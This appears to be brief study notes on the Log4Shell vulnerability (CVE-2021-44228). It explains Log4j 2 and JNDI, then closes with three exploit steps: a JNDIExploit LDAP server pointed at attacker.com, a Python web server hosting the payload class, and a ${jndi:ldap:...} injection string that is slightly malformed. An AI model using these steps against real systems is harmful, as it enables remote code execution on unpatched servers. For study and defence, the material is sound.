# What is Log4Shell?
  >Log4Shell is a critical Remote Code Execution (RCE) vulnerability in Apache    Log4j   a widely used Java logging library.

 >CVE-2021-44228 was published on December 9, 2021.

 >Allows attackers to execute arbitrary code remotely by injecting JNDI lookups in log messages.

 >Affects Log4j versions 2.0 to 2.14.1 (fixed in 2.15.0+).

 >Considered a zero-day vulnerability because attackers exploited it before a patch  was available.

# what is log4 2 , and what does it do 
  >Log4j 2 is an open-source Java logging framework used to record logs in applications.

  >Developers use it to log errors, system activity, and user inputs.

  >The vulnerability occurs because Log4j processes untrusted user input and performs JNDI lookups, allowing remote code execution.

  >Attackers commonly use LDAP servers (running on port 1389) to serve malicious Java payloads


# What is jndi 
 > java Naming and Directory Interface is an API  in java that allows applications to interact with naming and directory  like LDAP , DNS , RMI

 > help java application look up resources , objects , services dynamically at runtime

 > Commonly used with LDAP (Lightweight Directory Access Protocol) to retrieve stored objects.
 

# Step to expolit
 1.Set up a malicious LDAP server to deliver a remote payload
  > java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attacker.com -p 1389

 2.Host the malicious java class on a web server
  > pyhton3 -m http.server 8000

 3. Inject the payload into vulnerable application's log
   > ${jndi:ldap:$HOST:$PORT}
